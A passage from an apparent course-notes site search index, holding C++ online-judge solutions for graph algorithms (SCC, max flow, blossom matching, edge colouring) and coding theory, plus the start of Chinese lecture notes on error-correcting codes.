twoout[u].size(); j &lt; up; ++ j) {\n                    int v = twoout[u][j];\n                    if (tmp.find(v) == tmp.end() || u &gt; v) {\n                        continue;\n                    }\n                    ++ ans;\n                }\n            }\n            std::set&lt;int&gt; newbie;\n            tmp.swap(newbie);\n            printf(\"%d\\n\", ans);\n        } else if (inpo == 5) {\n            scanf(\"%d\", &amp;inps);\n            for (int j = 1, up = edges.size(); j &lt;= inps; ++ j) {\n                scanf(\"%d\", &amp;inpx);\n                if (inpx &gt; up) {\n                    continue;\n                }\n                -- inpx;\n                tmp.insert(std::get&lt;0&gt;(edges[inpx]));\n                tmp.insert(std::get&lt;1&gt;(edges[inpx]));\n            }\n            int ans = tmp.size();\n            std::set&lt;int&gt; newbie;\n            tmp.swap(newbie);\n            printf(\"%d\\n\", ans);\n        }\n    }\n\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1018/","title":"P1018","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 1000010, M = 1000010;\nint t, n, m;\nint head[N], nxt[M], to[M], idx;\nint dfn[N], low[N], tsp;\nint stk[N], top;\nbool ins[N];\nint scc_cnt, ans;\n\nvoid init(int x) {\n    tsp = idx = top = 0;\n    ans = scc_cnt = 0;\n    for (int i = 1; i &lt;= x; ++ i) {\n        head[i] = -1;\n        dfn[i] = low[i] = 0;\n        ins[i] = false;\n    }\n    return;\n}\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nvoid dfsearch(int x) {\n    ++ tsp;\n    dfn[x] = low[x] = tsp;\n    ++ top;\n    stk[top] = x;\n    ins[x] = true;\n    for (int i = head[x]; i != -1; i = nxt[i]) {\n        int e = to[i];\n        if (dfn[e] == 0) {\n            dfsearch(e);\n            low[x] = std::min(low[x], low[e]);\n        } else if (ins[e]) {\n            low[x] = std::min(low[x], dfn[e]);\n        }\n    }\n    if (dfn[x] == low[x]) {\n        ++ scc_cnt;\n        int y, large = 0;\n        do {\n            y = stk[top];\n            -- top;\n            ins[y] = false;\n            ++ large;\n        } while (y != x);\n        if (large &gt; 1) {\n            ++ ans;\n        }\n    }\n    return;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d\", &amp;n, &amp;m);\n        init(n);\n        for (int i = 1, inpu, inpv; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            add(inpu, inpv);\n        }\n        for (int i = 1; i &lt;= n; ++ i) {\n            if (dfn[i] == 0) {\n                dfsearch(i);\n            }\n        }\n        printf(\"%d\\n\", ans);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1019/","title":"P1019","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\nusing namespace std;\ntypedef long long ll;\n\nconst int N = 10010, M = 100010;\nconst ll INF = 1e14;\nint n, m, s, t;\nint head[N], to[M &lt;&lt; 1], cap[M &lt;&lt; 1], nxt[M &lt;&lt; 1], idx = 0;\nint dep[N], cur[N];\n\nvoid add(int u, int v, int c)\n{\n    to[idx] = v;\n    cap[idx] = c;\n    nxt[idx] = head[u];\n    head[u] = idx ++;\n    return;\n}\nbool bfsearch(void)\n{\n    queue&lt;int&gt; q;\n    memset(dep, -1, sizeof(dep));\n    dep[s] = 0, cur[s] = head[s], q.push(s);\n\n    while (!q.empty())\n    {\n        int fro = q.front(); q.pop();\n        for (int i = head[fro]; i != -1; i = nxt[i])\n        {\n            int e = to[i];\n            if (dep[e] == -1 &amp;&amp; cap[i])\n            {\n                cur[e] = head[e];\n                dep[e] = dep[fro] + 1;\n                if (e == t)\n                    return true;\n                q.push(e);\n            }\n        }\n    }\n    return false;\n}\nll extraRoad(int u, ll lim)\n{\n    if (u == t) return lim;\n    ll flow = 0;\n    for (int i = cur[u]; i != -1 &amp;&amp; flow &lt; lim; i = nxt[i])\n    {\n        cur[u] = i; int e = to[i];\n        if (dep[e] == dep[u] + 1 &amp;&amp; cap[i])\n        {\n            int del = extraRoad(e, min(1ll * cap[i], lim - flow));\n            if (!del)\n                dep[e] = -1;\n            flow += del, cap[i] -= del, cap[i xor 1] += del;\n        }\n    }\n    return flow;\n}\nll Dinic(void)\n{\n    ll res = 0, flow;\n    while (bfsearch())\n        while (flow = extraRoad(s, INF))\n            res += flow;\n    return res;\n}\n\nint main()\n{\n    memset(head, -1, sizeof(head));\n\n    scanf(\"%d%d%d%d\", &amp;n, &amp;m, &amp;s, &amp;t);\n    int inpu, inpv, inpc;\n    for (int i = 1; i &lt;= m; i ++)\n    {\n        scanf(\"%d%d%d\", &amp;inpu, &amp;inpv, &amp;inpc);\n        add(inpu, inpv, inpc), add(inpv, inpu, 0);\n    }\n    printf(\"%lld\\n\", Dinic());\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1020/","title":"P1020","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nconst int N = 2010, M = 80010;\nint t, n, m, ans;\nint match[N], pre[N];\nint head[N], nxt[M &lt;&lt; 1], to[M &lt;&lt; 1], idx;\nint cnt;\nint dfn[N], col[N];\nstruct Disjoint_Union_Set {\n    int pa[N];\n\n    int find(int x) {\n        return (x == pa[x]) ? pa[x] : (pa[x] = find(pa[x]));\n    }\n}dsu;\nstd::queue&lt;int&gt; q;\n\nvoid add(int u, int v) {\n    nxt[idx] = head[u];\n    to[idx] = v;\n    head[u] = idx;\n    ++ idx;\n    return;\n}\nint lca(int x, int y) {\n    ++ cnt;\n    x = dsu.find(x), y = dsu.find(y);\n    while (dfn[x] != cnt) {\n        dfn[x] = cnt;\n        x = dsu.find(pre[match[x]]);\n        if (y) {\n            std::swap(x, y);\n        }\n    }\n    return x;\n}\nvoid blossom(int x, int y, int z) {\n    while (dsu.find(x) != z) {\n        pre[x] = y;\n        y = match[x];\n        if (col[y] == 2) {\n            col[y] = 1;\n            q.push(y);\n        }\n        if (x == dsu.find(x)) {\n            dsu.pa[x] = z;\n        }\n        if (y == dsu.find(y)) {\n            dsu.pa[y] = z;\n        }\n        x = pre[y];\n    }\n    return;\n}\nint solve(int s) {\n    if (((ans + 1) &lt;&lt; 1) &gt; n) {\n        return 0;\n    }\n    for (int i = 1; i &lt;= n; ++ i) {\n        col[i] = 0;\n        dsu.pa[i] = i;\n    }\n    while (!q.empty()) {\n        q.pop();\n    }\n    q.push(s);\n    while (!q.empty()) {\n        int x = q.front();\n        q.pop();\n        for (int i = head[x]; i != -1; i = nxt[i]) {\n            int y = to[i];\n            if (dsu.find(x) == dsu.find(y) || col[y] == 2) {\n                continue;\n            }\n            if (col[y] == 0) {\n                col[y] = 2;\n                pre[y] = x;\n                if (match[y] == 0) {\n                    for (int j = y, last; j; j = last) {\n                        last = match[pre[j]];\n                        match[j] = pre[j];\n                        match[pre[j]] = j;\n                    }\n                    return 1;\n                }\n                col[match[y]] = 1;\n                q.push(match[y]);\n            } else {\n                int z;\n                z = lca(x, y);\n                blossom(x, y, z);\n                blossom(y, x, z);\n            }\n        }\n    }\n    return 0;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d\", &amp;n, &amp;m);\n        for (int i = 1; i &lt;= n; ++ i) {\n            head[i] = -1;\n            match[i] = dfn[i] = 0;\n        }\n        ans = cnt = 0;\n        for (int i = 1, inpu, inpv; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;inpu, &amp;inpv);\n            add(inpu, inpv);\n            add(inpv, inpu);\n        }\n        for (int i = 1; i &lt;= n; ++ i) {\n            if (match[i] == 0) {\n                ans += solve(i);\n            }\n        }\n        printf(\"%d\\n\", n - ans);\n        for (int i = 1; i &lt;= n; ++ i) {\n            if (match[i] != 0) {\n                if (i &lt; match[i]) {\n                    printf(\"%d %d\\n\", i, match[i]);\n                }\n            } else {\n                if (head[i] == -1) {\n                    puts(\"ISOLATED VERTEX! IMPOSSIBLE!\");\n                    exit(0);\n                }\n                printf(\"%d %d\\n\", i, to[head[i]]);\n            }\n        }\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1021/","title":"P1021","text":"<p>\u4e8b\u5b9e\u4e0a\u8fd9\u662f\u4e2a\u66b4\u529b\uff0cDCEC \u7b97\u6cd5\u6709\u65f6\u95f4\u518d\u8865\u5427\u3002</p> <pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long long i64;\nconst int N = 100010, M = 100010;\nint t, a, b, m;\nstruct Edges {\n    int u, v;\n}e[M];\nint deg[N];\nstd::unordered_map&lt;i64, int&gt; rec;\n\ni64 bipair(int x, int y) {\n    return 1ll * x * N + y;\n}\nint query(int x, int y) {\n// is x in the set of colors of edges adjacent to vertex y? \n    int z = bipair(x, y);\n    if (rec.find(z) == rec.end()) {\n        return 0;\n    } else {\n        return rec[z];\n    }\n    return 114514;\n}\nvoid modify(int x, int y, int ymatch) {\n    rec[bipair(x, y)] = ymatch;\n    return;\n}\nint mex(int u) {\n    int x = 1;\n    while (query(x, u) != 0) {\n        ++ x;\n    }\n    return x;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d%d\", &amp;a, &amp;b, &amp;m);\n        for (int i = 1; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;e[i].u, &amp;e[i].v);\n            e[i].v += a;\n            ++ deg[e[i].u];\n            ++ deg[e[i].v];\n        }\n        for (int i = 1; i &lt;= m; ++ i) {\n            int x = mex(e[i].u), y = mex(e[i].v);\n            modify(x, e[i].u, e[i].v);\n            modify(y, e[i].v, e[i].u);\n            if (x == y) {\n                continue;\n            }\n            int col = y, w = e[i].v;\n            while (w) {\n                int temp = query(x + y - col, w);\n                modify(x + y - col, w, query(col, w));\n                modify(col, w, temp);\n                w = temp;\n                col = x + y - col;\n            }\n        }\n        int ans = 0;\n        for (int i = 1; i &lt;= a + b; ++ i) {\n            ans = std::max(ans, deg[i]);\n        }\n        printf(\"%d\\n\", ans);\n        for (int i = 1; i &lt;= m; ++ i) {\n            for (int j = 1; j &lt;= ans; ++ j) {\n                if (query(j, e[i].u) == e[i].v) {\n                    printf(\"%d \", j);\n                }\n            }\n        }\n        puts(\"\");\n        for (int i = 1; i &lt;= a + b; ++ i) {\n            deg[i] = 0;\n        }\n        std::unordered_map&lt;i64, int&gt; newbie;\n        rec.swap(newbie);\n    }\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1022/","title":"P1022","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef std::pair&lt;int, int&gt; PII;\nconst int N = 410, M = (N * N);\nint t, n, m, k;\nstd::vector&lt;int&gt; adj[N];\nPII edges[M];\nint col[N][N];\nint have[N][N];\nbool vis[N];\nstruct Fan {\n    int cen; // centre;\n    std::vector&lt;int&gt; sat; // satellite\n\n    void init(void) {\n        cen = 0;\n        sat.clear();\n        sat.shrink_to_fit();\n        return;\n    }\n};\n\nvoid add(int u, int v) {\n    adj[u].push_back(v);\n    return;\n}\nvoid biadd(int u, int v) {\n    add(u, v), add(v, u);\n    return;\n}\nvoid get_fan(int u, int v, Fan &amp;f) {\n    f.cen = u;\n    f.sat.push_back(v);\n    for (int i = 1; i &lt;= n; ++ i) {\n        vis[i] = false;\n    }\n    vis[v] = true;\n    bool notmax = true;\n    while (notmax) {\n        notmax = false;\n        for (int i = 0, lim = adj[u].size(); i &lt; lim; ++ i) {\n            int w = adj[u][i];\n            if (!vis[w] &amp;&amp; col[u][w] != 0 &amp;&amp; have[v][col[u][w]] == 0) {\n                f.sat.push_back(w);\n                vis[w] = true;\n                v = w;\n                notmax = true;\n            }\n        }\n    }\n    return;\n}\nint mexcol(int x) {\n    int c = 1;\n    for ( ; c &lt;= k &amp;&amp; have[x][c] != 0; ++ c);\n    return c;\n}\nvoid go_path(int u, int v, int cl, int cu, std::vector&lt;int&gt; &amp;path) {\n    path.push_back(u), path.push_back(v);\n    int now = v, c = cu;\n    while (have[now][c] != 0) {\n        path.push_back(have[now][c]);\n        now = have[now][c];\n        c = cl + cu - c;\n    }\n    return;\n}\nvoid color(int u, int v, int c) {\n    col[u][v] = col[v][u] = c;\n    if (c != 0) {\n        have[u][c] = v;\n        have[v][c] = u;\n    }\n    return;\n}\nvoid rotate_and_color(Fan &amp;f, int w, int cl) {\n    int pos = 0;\n    for (int i = 0, lim = f.sat.size(); i &lt; lim; ++ i) {\n        int c = col[f.cen][f.sat[i]];\n        if (c != 0) {\n            have[f.cen][c] = have[f.sat[i]][c] = 0; \n        }\n        if (f.sat[i] == w) {\n            pos = i;\n            break;\n        }\n    }\n    for (int i = 1; i &lt;= pos; ++ i) {\n        color(f.cen, f.sat[i - 1], col[f.cen][f.sat[i]]);\n    }\n    color(f.cen, w, cl);\n    return;\n}\nFan f;\nstd::vector&lt;int&gt; path;\nvoid misra_gries(void) {\n    for (int i = 1; i &lt;= m; ++ i) {\n        int u = edges[i].first;\n        int v = edges[i].second;\n        f.init();\n        get_fan(u, v, f);\n        int cl = mexcol(f.sat[f.sat.size() - 1]);\n        int cu = mexcol(u);\n        int w = 0;\n        for (int i = 0, limi = f.sat.size() - 1; i &lt; limi; ++ i) {\n            if (col[u][f.sat[i]] == cl) {\n                path.clear();\n                path.shrink_to_fit();\n                go_path(u, f.sat[i], cl, cu, path);\n                for (int j = 0, limj = path.size(); j &lt; limj - 1; ++ j) {\n                    int c = col[path[j]][path[j + 1]];\n                    have[path[j]][c] = have[path[j + 1]][c] = 0;\n                }\n                for (int j = 0, limj = path.size(); j &lt; limj - 1; ++ j) {\n                    color(path[j], path[j + 1], cl + cu - col[path[j]][path[j + 1]]);\n                }\n                for (int j = 0, limj = path.size(); j &lt; limj; ++ j) {\n                    if (path[j] == f.sat[i - 1]) {\n                        w = f.sat[f.sat.size() - 1];\n                        break;\n                    }\n                }\n                if (w == 0) {\n                    w = f.sat[i - 1];\n                }\n                break;\n            }\n        }\n        if (w == 0) {\n            w = f.sat[f.sat.size() - 1];\n        }\n        rotate_and_color(f, w, cl);\n    }\n    return;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        scanf(\"%d%d\", &amp;n, &amp;m);\n        for (int i = 1, inpx, inpy; i &lt;= m; ++ i) {\n            scanf(\"%d%d\", &amp;inpx, &amp;inpy);\n            biadd(inpx, inpy);\n            edges[i] = std::make_pair(inpx, inpy);\n        }\n        k = 0;\n        for (int i = 1; i &lt;= n; ++ i) {\n            k = std::max(k, int(adj[i].size()));\n        }\n        misra_gries();\n        for (int i = 1; i &lt;= m; ++ i) {\n            printf(\"%d \", col[edges[i].first][edges[i].second]);\n        }\n        puts(\"\");\n        for (int i = 1; i &lt;= n; ++ i) {\n            adj[i].clear();\n            adj[i].shrink_to_fit();\n            for (int j = 1; j &lt;= n; ++ j) {\n                col[i][j] = have[i][j] = 0;\n            }\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1023/","title":"P1023","text":"<p>\u8be5\u9898\u88ab\u6253\u8d25\u4e86\uff0c\u6709\u65f6\u95f4\u518d\u8865\u5427\u3002</p>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1024/","title":"P1024","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef long double ld;\nint t;\nbool c[20];\n\nvoid trans(int x, int sep = 10) {\n    memset(c, false, sizeof(c));\n    for (int i = 0; x; ++ i, x &gt;&gt;= 1) {\n        c[i] = bool(x &amp; 1);\n    }\n    int stat = -1, end = -1;\n    for (int i = 19; i &gt;= sep; -- i) {\n        if (c[i]) {\n            stat = i;\n            break;\n        }\n    }\n    for (int i = 0; i &lt; sep; ++ i) {\n        if (c[i]) {\n            end = i;\n            break;\n        }\n    }\n    if (stat == -1) {\n        putchar('0');\n    } else {\n        for (int i = stat; i &gt;= sep; -- i) {\n            putchar('0' + int(c[i]));\n        }\n    }\n    if (end != -1) {\n        putchar('.');\n        for (int i = sep - 1; i &gt;= end; -- i) {\n            putchar('0' + int(c[i]));\n        }\n    }\n    puts(\"\");\n    return;\n}\n\nint main(void) {\n    scanf(\"%d\", &amp;t);\n    while (t --) {\n        ld inpx;\n        int x;\n        scanf(\"%Lf\", &amp;inpx);\n        x = round(inpx * 1024);\n        trans(x);\n    }\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1025/","title":"P1025","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\nint ksm(int a, int b, int p) {\n    int res = 1;\n    while (b) {\n        if (b &amp; 1) {\n            res = 1ll * res * a % p;\n        }\n        a = 1ll * a * a % p;\n        b &gt;&gt;= 1;\n    }\n    return res % p;\n}\n\nint main(void) {\n    int a, b, p;\n    scanf(\"%d%d%d\", &amp;a, &amp;b, &amp;p);\n    printf(\"%d\\n\", ksm(a, b, p));\n\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/OnlineJudges-Solutions/P1026/","title":"P1026","text":"<pre><code>#include &lt;bits/stdc++.h&gt;\n\ntypedef unsigned u32;\nconst int N = 16, M = 12, _2NM = 65536;\nint n, m, type;\nu32 a[N - M], g[N], h[N - M];\nu32 synd[_2NM], cole[_2NM];\nint wcur[_2NM], numsynd;\nu32 toenc, todec, syndrome;\n\nvoid mm(u32 *x, u32 *ty, u32 *z, int la, int lb, int lc) {\n    for (int i = 0; i &lt; la; ++ i) {\n        z[i] = 0;\n        for (int j = 0; j &lt; lc; ++ j) {\n            z[i] |= (1u &lt;&lt; __builtin_parity(x[i] &amp; ty[j]));\n        }\n    }\n    return;\n}\nvoid mv(u32 *x, u32 y, u32 &amp;z, int la, int lb) {\n    z = 0;\n    for (int i = 0; i &lt; la; ++ i) {\n        z |= (u32(__builtin_parity(x[i] &amp; y)) &lt;&lt; i);\n    }\n    return;\n}\nvoid get_coset_leader(void) {\n    numsynd = 0;\n    for (u32 i = 1; i &lt; (1u &lt;&lt; n); ++ i) {\n        u32 now = 0, temp = 0;\n        int w = 0;\n        for (int j = 0; j &lt; n; ++ j) {\n            now |= (((i &gt;&gt; j) &amp; 1) &lt;&lt; (n - 1 - j));\n            w += ((i &gt;&gt; j) &amp; 1);\n        }\n        mv(h, now, temp, n - m, n);\n        int ind = -1;\n        for (int j = 0; j &lt; numsynd; ++ j) {\n            if (temp == synd[j]) {\n                ind = j;\n                break;\n            }\n        }\n        if (ind == -1) {\n            ++ numsynd;\n            synd[numsynd - 1] = temp;\n            cole[numsynd - 1] = now;\n            wcur[numsynd - 1] = w;\n        } else if (w &lt; wcur[ind]) {\n            wcur[ind] = w;\n            cole[ind] = now;\n        }\n    }\n    return;\n}\nvoid encode(void) {\n    todec = 0;\n    mv(g, toenc, todec, n, m);\n    return;\n}\nvoid decode(void) {\n    syndrome = 0;\n    mv(h, todec, syndrome, n - m, n);\n    if (syndrome == 0) {\n        return;\n    }\n    int ind = -1;\n    for (int i = 0; i &lt; numsynd; ++ i) {\n        if (syndrome == synd[i]) {\n            ind = i;\n            break;\n        }\n    }\n    if (ind == -1) {\n        puts(\"There is something wrong!\");\n        exit(-1);\n    } else {\n        todec xor_eq cole[ind];\n    }\n    return;\n}\n\nint main(void) {\n    int T;\n    scanf(\"%d\", &amp;T);\n    while (T --) {\n        scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;type);\n        for (int i = 0; i &lt; n - m; ++ i) {\n            a[i] = h[i] = 0;\n        }\n        for (int i = 0; i &lt; n; ++ i) {\n            g[i] = 0;\n        }\n        for (int i = 0, temp; i &lt; n - m; ++ i) {\n            for (int j = 0; j &lt; m; ++ j) {\n                scanf(\"%d\", &amp;temp);\n                a[i] |= (u32(temp) &lt;&lt; j);\n            }\n        }\n        for (int i = 0; i &lt; m; ++ i) {\n            g[i] = (1u &lt;&lt; i);\n        }\n        for (int i = 0; i &lt; n - m; ++ i) {\n            g[i + m] = a[i];\n            h[i] = a[i];\n        }\n        for (int i = 0; i &lt; n - m; ++ i) {\n            h[i] |= (1u &lt;&lt; (i + m));\n        }\n        if (type == 0) {\n            numsynd = (1 &lt;&lt; (n - m));\n            for (int i = 0, temp; i &lt; (1 &lt;&lt; (n - m)); ++ i) {\n                synd[i] = cole[i] = 0;\n                for (int j = 0; j &lt; n - m; ++ j) {\n                    scanf(\"%d\", &amp;temp);\n                    synd[i] |= (u32(temp) &lt;&lt; j);\n                }\n                for (int j = 0; j &lt; n; ++ j) {\n                    scanf(\"%d\", &amp;temp);\n                    cole[i] |= (u32(temp) &lt;&lt; j);\n                }\n            }\n        } else {\n            get_coset_leader();\n        }\n        int q, inpo;\n        scanf(\"%d\", &amp;q);\n        while (q --) {\n            scanf(\"%d\", &amp;inpo);\n            if (inpo == 0) {\n                toenc = 0;\n                for (int i = 0, temp; i &lt; m; ++ i) {\n                    scanf(\"%d\", &amp;temp);\n                    toenc |= (u32(temp) &lt;&lt; i);\n                }\n                encode();\n            } else if (inpo == 1) {\n                todec = 0;\n                for (int i = 0, temp; i &lt; n; ++ i) {\n                    scanf(\"%d\", &amp;temp);\n                    todec |= (u32(temp) &lt;&lt; i);\n                }\n                decode();\n            }\n            for (int i = 0; i &lt; n; ++ i) {\n                printf(\"%d \", int((todec &gt;&gt; i) &amp; 1));\n            }\n            puts(\"\");\n        }\n    }\n    return 0;\n}\n</code></pre>"},{"location":"in_class_learning/semester_3/problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/","title":"L16 \u4ee3\u6570\u7f16\u7801","text":""},{"location":"in_class_learning/semester_3/problem_solving_III/Theory/L016_%E4%BB%A3%E6%95%B0%E7%BC%96%E7%A0%81/#error-detecting-and-correcting-codes","title":"\u9519\u8bef\u68c0\u6d4b\u4e0e\u7ea0\u6b63 Error-Detecting and Correcting Codes","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u6b64\u5904\u53ea\u8ba8\u8bba\u6bcf\u4e00\u4f4d\u8981\u4e48\u4e3a \\(0\\)\uff0c\u8981\u4e48\u4e3a \\(1\\) \u7684\u4e8c\u8fdb\u5236\u7f16\u7801\u3002</p> <p>\u57fa\u672c\u7684\u7f16\u7801\u8fc7\u7a0b\u662f\u8fd9\u6837\u7684\uff1a</p> <ol> <li>\u6211\u4eec\u9996\u5148\u6709\u4e00\u6761 \\(m\\) \u4f4d\u7684\u4fe1\u606f\uff08message\uff09</li> <li>\u6211\u4eec\u901a\u8fc7\u7f16\u7801\u5668\uff08encoder\uff09\u5c06\u5176\u7f16\u7801\u4e3a\u4e00\u4e2a \\(n\\) \u4f4d\u7684\u5b57\uff08word\uff09</li> <li>\u63a5\u4e0b\u6765\u53d1\u9001\u8005\uff08transmitter\uff09\u5c06\u5176\u53d1\u9001\u7ed9\u63a5\u6536\u8005\uff08receiver\uff09\uff0c\u7136\u800c\u8fd9\u5176\u4e2d\u53ef\u80fd\u6709\u566a\u58f0\uff08noise\uff09\u5e72\u6270\u3002</li> <li>\u63a5\u6536\u8005\u5f97\u5230\u4e86 \\(n\\) \u4f4d\u7684\u5b57\uff08received word\uff09\uff0c\u5c06\u5176\u653e\u5165\u89e3\u7801\u5668\uff08decoder\uff09\u3002</li> <li>\u89e3\u7801\u5668\u7ed9\u51fa\u89e3\u7801\u7684\u7ed3\u679c\uff1a\\(m\\) \u4f4d\u4fe1\u606f\uff08received message\uff09\u6216\u9519\u8bef\uff08error\uff09\u3002</li> </ol> <p>\u6211\u4eec\u79f0\u547c\u8fd9\u6837\u7684\u60c5\u5f62\u4e3a\u53d1\u751f\u4e86\u4e00\u4e2a\u9519\u8bef\uff1a\u5982\u679c\u5728\u7801\u5b57\uff08codeword\uff09\u4e2d\u6539\u53d8\u4e86\u4e00\u4f4d\u6216\u591a\u4f4d\u3002</p> <p>\u6211\u4eec\u79f0\u547c\u8fd9\u6837\u7684\u4e00\u4e2a\u7406\u8bba\u4e3a\u4e00\u4e2a\u89e3\u7801\u65b9\u6848\uff08decoding scheme\uff09\uff1a\u5bf9\u4e8e\u4efb\u610f\u7684 \\(n\\) \u4f4d\u5143\u7ec4\uff0c\u8981\u4e48\u5c06\u5176\u89e3\u7801\u4e3a\u6709\u610f\u4e49\u7684\u89e3\u7801\u540e\u4fe1\u606f\uff0c\u8981\u4e48\u8bf4\u660e\u5176\u5b58\u5728\u9519\u8bef\u3002</p> <p>Example 8.2 \u91cd\u590d\u4e09\u6b21\u7f16\u7801\uff1a\u5bf9\u4e8e\u4fe1\u606f \\((x_1,\\cdots, x_n)\\)\uff0c\u5176\u7f16\u7801\u7ed3\u679c\u4e3a \\(3n\\) \u4f4d\u7684 \\((x_1,\\cdots,x_n,x_1,\\cdots,x_n,x_1,\\cdots,x_n)\\)\uff0c\u5982\u679c\u5176\u5b58\u5728\u4e00\u4f4d\u6216\u4e24\u4f4d\u6539\u53d8\uff0c\u90a3\u4e48\u5176\u53ef\u4ee5\u68c0\u6d4b\u51fa\u6765\uff08\u4e09\u4e2a\u91cd\u590d\u4f4d\u4e0d\u4e00\u81f4\uff09\uff1b\u5982\u679c\u5b58\u5728\u4e00\u4f4d\u6539\u53d8\uff0c\u8fd8\u53ef\u4ee5\u7ea0\u6b63\uff08\u4e09\u4e2a\u91cd\u590d\u4f4d\u53d6\u66f4\u591a\u7684\u90a3\u4e00\u4f4d\uff09\u3002</p> <p>Example 8.3 \u5947\u5076\u6821\u9a8c\uff1a\u5bf9\u4e8e \\(n\\) \u4f4d\u4fe1\u606f \\(x_1,\\cdots, x_n\\)\uff0c\u6211\u4eec\u5728\u6700\u524d\u9762\u989d\u5916\u6dfb\u52a0\u4e00\u4e2a \\(x_0\\)\uff0c\u6ee1\u8db3 \\(x_0,\\cdots,x_n\\) \u4e2d \\(1\\) \u7684\u4e2a\u6570\u4e3a\u5076\u6570\u3002\u5982\u679c\u5b58\u5728\u4e00\u4f4d\u7684\u6539\u53d8\uff0c\u90a3\u4e48\u6211\u4eec\u53ef\u4ee5\u68c0\u6d4b\u51fa\u6765\uff08\\(1\\) \u4e2a\u6570\u7684\u5947\u5076\u6027\u88ab\u7834\u574f\uff09\uff0c\u4f46\u65e0\u6cd5\u7ea0\u6b63\uff1b\u591a\u4f59\u4e00\u4f4d\u7684\u6539\u53d8\u65e0\u6cd5\u68c0\u6d4b\u3002\u6b64\u5904 \\(x_0\\) \u79f0\u4e3a\u5947\u5076\u6821\u9a8c\u4f4d\u6216\u5947\u5076\u68c0\u9a8c\u4f4d\uff08parity check bit\uff09.</p> <p>\u6700\u5927\u4f3c\u7136\u89e3\u7801\uff08maximum-likelihood decoding\uff09\uff1a\u6211\u4eec\u5047\u8bbe\u5982\u679c\u6211\u4eec\u6536\u5230\u4e86\u4e00\u6761\u88ab\u566a\u58f0\u6539\u53d8\u7684\u4fe1\u606f\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u5f53\u5047\u8bbe\u566a\u58f0\u5e94\u4e3a\u6700\u5c0f\u53ef\u80fd\u7684\u90a3\u4e2a\u566a\u58f0\uff0c\u4e5f\u5c31\u662f\u6539\u53d8\u524d\u4fe1\u606f\u5e94\u53d6\u6240\u6709\u53ef\u80fd\u7684\u6539\u53d8\u524d\u4fe1\u606f\u548c\u6539\u53d8\u540e\u4fe1\u606f\u4e2d\uff0c\u5dee\u8ddd\u6700\u5c0f\u7684\u90a3\u6761\u3002\u4f9d\u7167\u8fd9\u4e2a\u5047\u8bbe\u5728\u5bf9\u5176\u8fdb\u884c\u7ea0\u6b63\u3001\u89e3\u7801\u3002\u8fd9\u4e00\u539f\u5219\u4fbf\u79f0\u4e3a\u6700\u5927\u4f3c\u7136\u89e3\u7801\u539f\u5219\u3002</p> <p>\u4e00\u6761\u4e8c\u8fdb\u5236\u5bf9\u79f0\u4fe1\u9053\uff08binary symmetric channel\uff09\u662f\u8fd9\u6837\u4e00\u4e2a\u6a21\u578b\uff1a\u5176\u7531\u4e00\u4e2a\u53ea\u80fd\u53d1\u9001\u4e8c\u8fdb\u5236\u4fe1\u53f7\u7684\u53d1\u9001\u8005\uff08transmitter\uff09\u548c\u4e00\u4e2a\u63a5\u53d7\u8005\u6784\u6210\u3002</p> <p>Th. 8.7 \u5982\u679c\u5728\u4e00\u6761\u4e8c\u8fdb\u5236\u5bf9\u79f0\u4fe1\u9053\u4e2d\uff0c\u4e00\u4f4d\u4fe1\u606f\u6709 \\(p\\) \u7684\u53ef\u80fd\u4e0d\u7ffb\u8f6c\uff0c\\(q=1-p\\) \u7684\u6982\u7387\u7ffb\u8f6c\uff0c\u90a3\u4e48\u4e00\u6761 \\(n\\) \u4f4d\u4e8c\u8fdb\u5236\u4fe1\u606f\u6070\u6709 \\(k\\) \u4f4d\u6539\u53d8\u7684\u6982\u7387\u662f\uff1a $$ \\binom{n}{k}q^kp^{n-k} $$ \u7801\uff08codes\uff09\uff1a\u5728\u8c08\u8bba\u4e2d\u53ef\u80fd\u51fa\u73b0\u7684\u7279\u5b9a\u4e8c\u8fdb\u5236\u4e32\u7684\u96c6\u5408\u3002</p> <p>\u5757\u7801\uff08block codes\uff09\uff1a\u4e00\u822c\u6765\u8bf4\uff0c\u6211\u4eec\u5bf9\u4e8e\u957f\u5ea6\u4e3a \\(km\\) \u7684\u4e32\uff0c\u5e38\u5e38\u5c06\u5176\u6bcf \\(m\\) 